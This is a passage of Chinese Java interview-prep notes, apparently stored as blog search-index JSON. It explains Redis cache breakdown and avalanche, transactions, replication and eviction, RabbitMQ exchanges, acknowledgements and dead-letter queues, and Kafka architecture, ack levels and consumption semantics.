对于一些设置了过期时间的key，如果这些key可能会在某些时间点被超高并发地访问，是一种非常“热点”的数据。这个时候，需要考虑一个问题：缓存被“击穿”的问题，这个和缓存雪崩的区别在于这里针对某一key缓存，前者则是很多key。 缓存在某个时间点过期的时候，恰好在这个时间点对这个Key有大量的并发请求过来，这些请求发现缓存过期一般都会从后端DB加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端DB压垮。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:26:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"解决方案 缓存失效时的雪崩效应对底层系统的冲击非常可怕。大多数系统设计者考虑用加锁或者队列的方式保证缓存的单线 程（进程）写，从而避免失效时大量的并发请求落到底层存储系统上。这里分享一个简单方案就时讲缓存失效时间分散开，比如我们可以在原有的失效时间基础上增加一个随机值，比如1-5分钟随机，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:26:1","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"缓存雪崩 缓存雪崩是指在我们设置缓存时采用了相同的过期时间，导致缓存在某一时刻同时失效，请求全部转发到DB，DB瞬时压力过重雪崩。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:27:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"解决方案 1.使用互斥锁(mutex key) 业界比较常用的做法，是使用mutex。简单地来说，就是在缓存失效的时候（判断拿出来的值为空），不是立即去load db，而是先使用缓存工具的某些带成功操作返回值的操作（比如Redis的SETNX或者Memcache的ADD）去set一个mutex key，当操作返回成功时，再进行load db的操作并回设缓存；否则，就重试整个get缓存的方法。 SETNX，是「SET if Not eXists」的缩写，也就是只有不存在的时候才设置，可以利用它来实现锁的效果。在redis2.6.1之前版本未实现setnx的过期时间 2.“提前\"使用互斥锁(mutex key)： 在value内部设置1个超时值(timeout1), timeout1比实际的memcache timeout(timeout2)小。当从cache读取到timeout1发现它已经过期时候，马上延长timeout1并重新设置到cache。然后再从数据库加载数据并设置到cache中。 3.“永远不过期”： 这里的“永远不过期”包含两层意思： (1) 从redis上看，确实没有设置过期时间，这就保证了，不会出现热点key过期问题，也就是“物理”不过期。 (2) 从功能上看，如果不过期，那不就成静态的了吗？所以我们把过期时间存在key对应的value里，如果发现要过期了，通过一个后台的异步线程进行缓存的构建，也就是“逻辑”过期 从实战看，这种方法对于性能非常友好，唯一不足的就是构建缓存时候，其余线程(非构建缓存的线程)可能访问的是老数据，但是对于一般的互联网功能来说这个还是可以忍受。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:27:1","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"总结 穿透：缓存不存在，数据库不存在，高并发，少量key 击穿：缓存不存在，数据库存在，高并发，少量key 雪崩：缓存不存在，数据库存在，高并发，大量key ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:28:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"语义有些许差异，但是，都可以使用限流的互斥锁，保障数据库的稳定 redis事务是怎么实现的 MULTI 、 EXEC 、 DISCARD 和 WATCH 是 Redis 事务相关的命令。事务可以一次执行多个命令， 并且带有以下两个重要的保证： 事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。 事务是一个原子操作：事务中的命令要么全部被执行，要么全部都不执行。 EXEC 命令负责触发并执行事务中的所有命令： 如果客户端在使用 MULTI 开启了一个事务之后，却因为断线而没有成功执行 EXEC ，那么事务中的所有命令都不会被执行。 另一方面，如果客户端成功在开启事务之后执行 EXEC ，那么事务中的所有命令都会被执行。 当使用 AOF 方式做持久化的时候， Redis 会使用单个 write(2) 命令将事务写入到磁盘中。 然而，如果 Redis 服务器因为某些原因被管理员杀死，或者遇上某种硬件故障，那么可能只有部分事务命令会被成功写入到磁盘中。 如果 Redis 在重新启动时发现 AOF 文件出了这样的问题，那么它会退出，并汇报一个错误。 使用redis-check-aof程序可以修复这一问题：它会移除 AOF 文件中不完整事务的信息，确保服务器可以顺利启动。 从 2.2 版本开始，Redis 还可以通过乐观锁（optimistic lock）实现 CAS （check-and-set）操作，具体信息请参考文档的后半部分。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:29:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"事务中的错误 使用事务时可能会遇上以下两种错误： 事务在执行 EXEC 之前，入队的命令可能会出错。比如说，命令可能会产生语法错误（参数数量错误，参数名错误，等等），或者其他更严重的错误，比如内存不足（如果服务器使用 maxmemory 设置了最大内存限制的话）。 命令可能在 EXEC 调用之后失败。举个例子，事务中的命令可能处理了错误类型的键，比如将列表命令用在了字符串键上面，诸如此类。 对于发生在 EXEC 执行之前的错误，客户端以前的做法是检查命令入队所得的返回值：如果命令入队时返回 QUEUED ，那么入队成功；否则，就是入队失败。如果有命令在入队时失败，那么大部分客户端都会停止并取消这个事务。 不过，从 Redis 2.6.5 开始，服务器会对命令入队失败的情况进行记录，并在客户端调用 EXEC 命令时，拒绝执行并自动放弃这个事务。 在 Redis 2.6.5 以前， Redis 只执行事务中那些入队成功的命令，而忽略那些入队失败的命令。 而新的处理方式则使得在流水线（pipeline）中包含事务变得简单，因为发送事务和读取事务的回复都只需要和服务器进行一次通讯。 至于那些在 EXEC 命令执行之后所产生的错误， 并没有对它们进行特别处理： 即使事务中有某个/某些命令在执行时产生了错误， 事务中的其他命令仍然会继续执行。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:30:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"为什么 Redis 不支持回滚（roll back） 如果你有使用关系式数据库的经验， 那么 “Redis 在事务失败时不进行回滚，而是继续执行余下的命令”这种做法可能会让你觉得有点奇怪。 以下是这种做法的优点： Redis 命令只会因为错误的语法而失败（并且这些问题不能在入队时发现），或是命令用在了错误类型的键上面：这也就是说，从实用性的角度来说，失败的命令是由编程错误造成的，而这些错误应该在开发的过程中被发现，而不应该出现在生产环境中。 因为不需要对回滚进行支持，所以 Redis 的内部可以保持简单且快速。 有种观点认为 Redis 处理事务的做法会产生 bug ， 然而需要注意的是， 在通常情况下， 回滚并不能解决编程错误带来的问题。 举个例子， 如果你本来想通过 INCR 命令将键的值加上 1 ， 却不小心加上了 2 ， 又或者对错误类型的键执行了 INCR ， 回滚是没有办法处理这些情况的。 redis集群方案有哪些 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:31:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"常见集群分类 主从复制集群 分片集群 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:32:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"redis有那些： 主从复制集群，手动切换 带有哨兵的HA的主从复制集群 客户端实现路由索引的分片集群 使用中间件代理层的分片集群 redis自身实现的cluster分片集群 redis主从复制的原理是什么 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:33:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"主从复制机制 当一个 master 实例和一个 slave 实例连接正常时， master 会发送一连串的命令流来保持对 slave 的更新，以便于将自身数据集的改变复制给 slave ， ：包括客户端的写入、key 的过期或被逐出等等。 当 master 和 slave 之间的连接断开之后，因为网络问题、或者是主从意识到连接超时， slave 重新连接上 master 并会尝试进行部分重同步：这意味着它会尝试只获取在断开连接期间内丢失的命令流。 当无法进行部分重同步时， slave 会请求进行全量重同步。这会涉及到一个更复杂的过程，例如 master 需要创建所有数据的快照，将之发送给 slave ，之后在数据集更改时持续发送命令流到 slave 。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:34:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"主从复制的关注点 Redis 使用异步复制，slave 和 master 之间异步地确认处理的数据量 一个 master 可以拥有多个 slave slave 可以接受其他 slave 的连接。除了多个 slave 可以连接到同一个 master 之外， slave 之间也可以像层叠状的结构（cascading-like structure）连接到其他 slave 。自 Redis 4.0 起，所有的 sub-slave 将会从 master 收到完全一样的复制流。 Redis 复制在 master 侧是非阻塞的。这意味着 master 在一个或多个 slave 进行初次同步或者是部分重同步时，可以继续处理查询请求。 复制在 slave 侧大部分也是非阻塞的。当 slave 进行初次同步时，它可以使用旧数据集处理查询请求，假设你在 redis.conf 中配置了让 Redis 这样做的话。否则，你可以配置如果复制流断开， Redis slave 会返回一个 error 给客户端。但是，在初次同步之后，旧数据集必须被删除，同时加载新的数据集。 slave 在这个短暂的时间窗口内（如果数据集很大，会持续较长时间），会阻塞到来的连接请求。自 Redis 4.0 开始，可以配置 Redis 使删除旧数据集的操作在另一个不同的线程中进行，但是，加载新数据集的操作依然需要在主线程中进行并且会阻塞 slave 。 复制既可以被用在可伸缩性，以便只读查询可以有多个 slave 进行（例如 O(N) 复杂度的慢操作可以被下放到 slave ），或者仅用于数据安全。 可以使用复制来避免 master 将全部数据集写入磁盘造成的开销：一种典型的技术是配置你的 master Redis.conf 以避免对磁盘进行持久化，然后连接一个 slave ，其配置为不定期保存或是启用 AOF。但是，这个设置必须小心处理，因为重新启动的 master 程序将从一个空数据集开始：如果一个 slave 试图与它同步，那么这个 slave 也会被清空。 任何时候数据安全性都是很重要的，所以如果 master 使用复制功能的同时未配置持久化，那么自动重启进程这项应该被禁用。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:35:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Redis 复制功能是如何工作的 每一个 Redis master 都有一个 replication ID ：这是一个较大的伪随机字符串，标记了一个给定的数据集。每个 master 也持有一个偏移量，master 将自己产生的复制流发送给 slave 时，发送多少个字节的数据，自身的偏移量就会增加多少，目的是当有新的操作修改自己的数据集时，它可以以此更新 slave 的状态。复制偏移量即使在没有一个 slave 连接到 master 时，也会自增，所以基本上每一对给定的 Replication ID, offset 都会标识一个 master 数据集的确切版本。 当 slave 连接到 master 时，它们使用 PSYNC 命令来发送它们记录的旧的 master replication ID 和它们至今为止处理的偏移量。通过这种方式， master 能够仅发送 slave 所需的增量部分。但是如果 master 的缓冲区中没有足够的命令积压缓冲记录，或者如果 slave 引用了不再知道的历史记录（replication ID），则会转而进行一个全量重同步：在这种情况下， slave 会得到一个完整的数据集副本，从头开始。 下面是一个全量同步的工作细节： master 开启一个后台保存进程，以便于生产一个 RDB 文件。同时它开始缓冲所有从客户端接收到的新的写入命令。当后台保存完成时， master 将数据集文件传输给 slave， slave将之保存在磁盘上，然后加载文件到内存。再然后 master 会发送所有缓冲的命令发给 slave。这个过程以指令流的形式完成并且和 Redis 协议本身的格式相同。 你可以用 telnet 自己进行尝试。在服务器正在做一些工作的同时连接到 Redis 端口并发出 SYNC 命令。你将会看到一个批量传输，并且之后每一个 master 接收到的命令都将在 telnet 回话中被重新发出。事实上 SYNC 是一个旧协议，在新的 Redis 实例中已经不再被使用，但是其仍然向后兼容：但它不允许部分重同步，所以现在 PSYNC 被用来替代 SYNC。 之前说过，当主从之间的连接因为一些原因崩溃之后， slave 能够自动重连。如果 master 收到了多个 slave 要求同步的请求，它会执行一个单独的后台保存，以便于为多个 slave 服务。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:36:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"无需磁盘参与的复制 正常情况下，一个全量重同步要求在磁盘上创建一个 RDB 文件，然后将它从磁盘加载进内存，然后 slave以此进行数据同步。 如果磁盘性能很低的话，这对 master 是一个压力很大的操作。Redis 2.8.18 是第一个支持无磁盘复制的版本。在此设置中，子进程直接发送 RDB 文件给 slave，无需使用磁盘作为中间储存介质。 redis缓存如何回收 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:37:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"回收策略 noeviction:返回错误当内存限制达到并且客户端尝试执行会让更多内存被使用的命令（大部分的写入指令，但DEL和几个例外） allkeys-lru: 尝试回收最少使用的键（LRU），使得新添加的数据有空间存放。 volatile-lru: 尝试回收最少使用的键（LRU），但仅限于在过期集合的键,使得新添加的数据有空间存放。 allkeys-random: 回收随机的键使得新添加的数据有空间存放。 volatile-random: 回收随机的键使得新添加的数据有空间存放，但仅限于在过期集合的键。 volatile-ttl: 回收在过期集合的键，并且优先回收存活时间（TTL）较短的键,使得新添加的数据有空间存放。 volatile-lfu：从所有配置了过期时间的键中驱逐使用频率最少的键 allkeys-lfu：从所有键中驱逐使用频率最少的键 如果没有键满足回收的前提条件的话，策略volatile-lru, volatile-random以及volatile-ttl就和noeviction 差不多了。 选择正确的回收策略是非常重要的，这取决于你的应用的访问模式，不过你可以在运行时进行相关的策略调整，并且监控缓存命中率和没命中的次数，通过RedisINFO命令输出以便调优。 一般的经验规则: 使用allkeys-lru策略：当你希望你的请求符合一个幂定律分布，也就是说，你希望部分的子集元素将比其它其它元素被访问的更多。如果你不确定选择什么，这是个很好的选择。. 使用allkeys-random：如果你是循环访问，所有的键被连续的扫描，或者你希望请求分布正常（所有元素被访问的概率都差不多）。 使用volatile-ttl：如果你想要通过创建缓存对象时设置TTL值，来决定哪些对象应该被过期。 allkeys-lru 和 volatile-random策略对于当你想要单一的实例实现缓存及持久化一些键时很有用。不过一般运行两个实例是解决这个问题的更好方法。 为了键设置过期时间也是需要消耗内存的，所以使用allkeys-lru这种策略更加高效，因为没有必要为键取设置过期时间当内存有压力时。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:38:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"回收进程如何工作 理解回收进程如何工作是非常重要的: 一个客户端运行了新的命令，添加了新的数据。 Redi检查内存使用情况，如果大于maxmemory的限制, 则根据设定好的策略进行回收。 一个新的命令被执行，等等。 所以我们不断地穿越内存限制的边界，通过不断达到边界然后不断地回收回到边界以下。 如果一个命令的结果导致大量内存被使用（例如很大的集合的交集保存到一个新的键），不用多久内存限制就会被这个内存使用量超越。 RabbitMQ的架构设计是什么样的 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:39:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"是AMQP的实现，相关概念语义 Broker:它提供一种传输服务,它的角色就是维护一条从生产者到消费者的路线，保证数据能按照指定的方式进行传输 Exchange：消息交换机,它指定消息按什么规则,路由到哪个队列。 Queue:消息的载体,每个消息都会被投到一个或多个队列。 Binding:绑定，它的作用就是把exchange和queue按照路由规则绑定起来. Routing Key:路由关键字,exchange根据这个关键字进行消息投递。 vhost:虚拟主机,一个broker里可以有多个vhost，用作不同用户的权限分离。 Producer:消息生产者,就是投递消息的程序. Consumer:消息消费者,就是接受消息的程序. Channel:消息通道,在客户端的每个连接里,可建立多个channel. ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:40:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"核心概念 在mq领域中，producer将msg发送到queue，然后consumer通过消费queue完成P.C解耦 kafka是由producer决定msg发送到那个queue rabbitmq是由Exchange决定msg应该怎么样发送到目标queue，这就是binding及对应的策略 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:40:1","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Exchange Direct Exchange:直接匹配,通过Exchange名称+RountingKey来发送与接收消息. Fanout Exchange:广播订阅,向所有的消费者发布消息,但是只有消费者将队列绑定到该路由器才能收到消息,忽略Routing Key. Topic Exchange：主题匹配订阅,这里的主题指的是RoutingKey,RoutingKey可以采用通配符,如:*或#，RoutingKey命名采用.来分隔多个词,只有消息这将队列绑定到该路由器且指定RoutingKey符合匹配规则时才能收到消息; Headers Exchange:消息头订阅,消息发布前,为消息定义一个或多个键值对的消息头,然后消费者接收消息同时需要定义类似的键值对请求头:(如:x-mactch=all或者x_match=any)，只有请求头与消息头匹配,才能接收消息,忽略RoutingKey. 默认的exchange:如果用空字符串去声明一个exchange，那么系统就会使用”amq.direct”这个exchange，我们创建一个queue时,默认的都会有一个和新建queue同名的routingKey绑定到这个默认的exchange上去 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:40:2","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"复杂与精简 在众多的MQ中间件中，首先学习Rabbitmq的时候，就理解他是一个单机的mq组件，为了系统的解耦，可以自己在业务层面做AKF 其在内卷能力做的非常出色，这得益于AMQP，也就是消息的传递形式、复杂度有exchange和queue的binding实现，这，对于P.C有很大的帮助 RabbitMQ如何确保消息发送和消息接收 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:41:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"消息发送确认 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:42:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"1 ConfirmCallback方法 ConfirmCallback 是一个回调接口，消息发送到 Broker 后触发回调，确认消息是否到达 Broker 服务器，也就是只确认是否正确到达 Exchange 中。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:42:1","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"2 ReturnCallback方法 通过实现 ReturnCallback 接口，启动消息失败返回，此接口是在交换器路由不到队列时触发回调，该方法可以不使用，因为交换器和队列是在代码里绑定的，如果消息成功投递到 Broker 后几乎不存在绑定队列失败，除非你代码写错了。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:42:2","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"消息接收确认 RabbitMQ 消息确认机制（ACK）默认是自动确认的，自动确认会在消息发送给消费者后立即确认，但存在丢失消息的可能，如果消费端消费逻辑抛出异常，假如你用回滚了也只是保证了数据的一致性，但是消息还是丢了，也就是消费端没有处理成功这条消息，那么就相当于丢失了消息。 消息确认模式有： AcknowledgeMode.NONE：自动确认。 AcknowledgeMode.AUTO：根据情况确认。 AcknowledgeMode.MANUAL：手动确认。 消费者收到消息后，手动调用 Basic.Ack 或 Basic.Nack 或 Basic.Reject 后，RabbitMQ 收到这些消息后，才认为本次投递完成。 Basic.Ack 命令：用于确认当前消息。 Basic.Nack 命令：用于否定当前消息（注意：这是AMQP 0-9-1的RabbitMQ扩展） 。 Basic.Reject 命令：用于拒绝当前消息。 Nack,Reject后都有能力要求是否requeue消息或者进入死信队列 RabbitMQ事务消息原理是什么 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:43:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"事务V.S确认 确认是对一件事的确认 事务是对批量的确认 增删改查中，事务是对于增删改的保证 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:44:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"发送方事务 开启事务，发送多条数据，事务提交或回滚是原子的，要么都提交，要么都回滚 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:45:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"消费方事务 消费方是读取行为，那么事务体现在哪里呢 rabbitmq的消费行为会触发queue中msg的是否删除、是否重新放回队列等行为，类增删改 所以，消费方的ack是要手动提交的，且最终确定以事务的提交和回滚决定 RabbitMQ死信队列、延时队列分别是什么 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:46:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"死信队列 DLX（Dead Letter Exchange），死信交换器。 当队列中的消息被拒绝、或者过期会变成死信，死信可以被重新发布到另一个交换器，这个交换器就是DLX，与DLX绑定的队列称为死信队列。 造成死信的原因： 信息被拒绝 信息超时 超过了队列的最大长度 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:47:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"过期消息： 在 rabbitmq 中存在2种方可设置消息的过期时间，第一种通过对队列进行设置，这种设置后，该队列中所有的消息都存在相同的过期时间，第二种通过对消息本身进行设置，那么每条消息的过期时间都不一样。如果同时使用这2种方法，那么以过期时间小的那个数值为准。当消息达到过期时间还没有被消费，那么那个消息就成为了一个 死信 消息。 队列设置：在队列申明的时候使用 x-message-ttl 参数，单位为 毫秒 单个消息设置：是设置消息属性的 expiration 参数的值，单位为 毫秒 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:47:1","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"延迟队列 延迟队列存储的是延迟消息 延迟消息指的是，当消息被发发布出去之后，并不立即投递给消费者，而是在指定时间之后投递。如： 在订单系统中，订单有30秒的付款时间，在订单超时之后在投递给消费者处理超时订单。 rabbitMq没有直接支持延迟队列，可以通过死信队列实现。 在死信队列中，可以为普通交换器绑定多个消息队列，假设绑定过期时间为5分钟，10分钟和30分钟，3个消息队列，然后为每个消息队列设置DLX，为每个DLX关联一个死信队列。 当消息过期之后，被转存到对应的死信队列中，然后投递给指定的消费者消费。 简述kafka架构设计是什么样 语义概念 1 broker Kafka 集群包含一个或多个服务器，服务器节点称为broker。 broker存储topic的数据。如果某topic有N个partition，集群有N个broker，那么每个broker存储该topic的一个partition。 如果某topic有N个partition，集群有(N+M)个broker，那么其中有N个broker存储该topic的一个partition，剩下的M个broker不存储该topic的partition数据。 如果某topic有N个partition，集群中broker数目少于N个，那么一个broker存储该topic的一个或多个partition。在实际生产环境中，尽量避免这种情况的发生，这种情况容易导致Kafka集群数据不均衡。 2 Topic 每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic。（物理上不同Topic的消息分开存储，逻辑上一个Topic的消息虽然保存于一个或多个broker上但用户只需指定消息的Topic即可生产或消费数据而不必关心数据存于何处） 类似于数据库的表名 3 Partition topic中的数据分割为一个或多个partition。每个topic至少有一个partition。每个partition中的数据使用多个segment文件存储。partition中的数据是有序的，不同partition间的数据丢失了数据的顺序。如果topic有多个partition，消费数据时就不能保证数据的顺序。在需要严格保证消息的消费顺序的场景下，需要将partition数目设为1。 4 Producer 生产者即数据的发布者，该角色将消息发布到Kafka的topic中。broker接收到生产者发送的消息后，broker将该消息追加到当前用于追加数据的segment文件中。生产者发送的消息，存储到一个partition中，生产者也可以指定数据存储的partition。 5 Consumer 消费者可以从broker中读取数据。消费者可以消费多个topic中的数据。 6 Consumer Group 每个Consumer属于一个特定的Consumer Group（可为每个Consumer指定group name，若不指定group name则属于默认的group）。这是kafka用来实现一个topic消息的广播（发给所有的consumer）和单播（发给任意一个consumer）的手段。一个topic可以有多个CG。topic的消息会复制-给consumer。如果需要实现广播，只要每个consumer有一个独立的CG就可以了。要实现单播只要所有的consumer在同一个CG。用CG还可以将consumer进行自由的分组而不需要多次发送消息到不同的topic。 7 Leader 每个partition有多个副本，其中有且仅有一个作为Leader，Leader是当前负责数据的读写的partition。 8 Follower Follower跟随Leader，所有写请求都通过Leader路由，数据变更会广播给所有Follower，Follower与Leader保持数据同步。如果Leader失效，则从Follower中选举出一个新的Leader。当Follower与Leader挂掉、卡住或者同步太慢，leader会把这个follower从“in sync replicas”（ISR）列表中删除，重新创建一个Follower。 9 Offset kafka的存储文件都是按照offset.kafka来命名，用offset做名字的好处是方便查找。例如你想找位于2049的位置，只要找到2048.kafka的文件即可。当然the first offset就是00000000000.kafka KAFKA天生是分布式的，满足AKF的XYZ轴特点，扩展性，可靠性，高性能是没得说 而且，kafka具备自己的特色，比如动态ISR集合，是在强一致性，过半一致性之外的另一个实现手段 Kafka消息丢失的场景有哪些 生产者在生产过程中的消息丢","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:48:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"ACK机制 ack有3个可选值，分别是1，0，-1。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:49:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"ack=0：生产者在生产过程中的消息丢失 简单来说就是，producer发送一次就不再发送了，不管是否发送成功。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:50:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"ack=1：broker在故障后的消息丢失 简单来说就是，producer只要收到一个分区副本成功写入的通知就认为推送消息成功了。这里有一个地方需要注意，这个副本必须是leader副本。只有leader副本成功写入了，producer才会认为消息发送成功。 注意，ack的默认值就是1。这个默认值其实就是吞吐量与可靠性的一个折中方案。生产上我们可以根据实际情况进行调整，比如如果你要追求高吞吐量，那么就要放弃可靠性。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:51:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"ack=-1：生产侧和存储侧不会丢失数据 简单来说就是，producer只有收到分区内所有副本的成功写入的通知才认为推送消息成功了。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:52:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Offset机制 kafka消费者的三种消费语义 at-most-once：最多一次，可能丢数据 at-least-once：最少一次，可能重复消费数据 exact-once message：精确一次 Kafka是pull？push？以及优劣势分析 Kafka最初考虑的问题是，customer应该从brokes拉取消息还是brokers将消息推送到consumer，也就是pull还push。 Kafka遵循了一种大部分消息系统共同的传统的设计：producer将消息推送到broker，consumer从broker拉取消息。 一些消息系统比如Scribe和Apache Flume采用了push模式，将消息推送到下游的consumer。 这样做有好处也有坏处：由broker决定消息推送的速率，对于不同消费速率的consumer就不太好处理了。 消息系统都致力于让consumer以最大的速率最快速的消费消息，但不幸的是，push模式下，当broker推送的速率远大于consumer消费的速率时，consumer恐怕就要崩溃了。 最终Kafka还是选取了传统的pull模式。 Pull模式的另外一个好处是consumer可以自主决定是否批量的从broker拉取数据。 Push模式必须在不知道下游consumer消费能力和消费策略的情况下决定是立即推送每条消息还是缓存之后批量推送。 如果为了避免consumer崩溃而采用较低的推送速率，将可能导致一次只推送较少的消息而造成浪费。 Pull模式下，consumer就可以根据自己的消费能力去决定这些策略。 Pull有个缺点是，如果broker没有可供消费的消息，将导致consumer不断在循环中轮询，直到新消息到达。 为了避免这点，Kafka有个参数可以让consumer阻塞知道新消息到达(当然也可以阻塞知道消息的数量达到某个特定的量这样就可以批量发 Kafka中zk的作用是什么 Zookeeper是分布式协调，注意它不是数据库 kafka中使用了zookeeper的分布式锁和分布式配置及统一命名的分布式协调解决方案 在kafka的broker集群中的controller的选择，是通过zk的临时节点争抢获得的 brokerID等如果自增的话也是通过zk的节点version实现的全局唯一 kafka中broker中的状态数据也是存储在zk中，不过这里要注意，zk不是数据库，所以存储的属于元数据 而，新旧版本变化中，就把曾经的offset从zk中迁移出了zk Kafka中高性能如何保障 首先，性能的最大瓶颈依然是IO，这个是不能逾越的鸿沟 虽然，broker在持久化数据的时候已经最大努力的使用了磁盘的顺序读写 更进一步的性能优化是零拷贝的使用，也就是从磁盘日志到消费者客户端的数据传递，因为kafka是mq，对于msg不具备加工处理，所以得以实现 然后就是大多数分布式系统一样，总要做tradeoff，在速度与可用性/可靠性中挣扎 ACK的0，1，-1级别就是在性能和可靠中权衡 kafka的rebalance机制是什么 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:53:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"消费者分区分配策略 Range 范围分区(默认的) RoundRobin 轮询分区 Sticky策略 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:54:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"触发 Rebalance 的时机 Rebalance 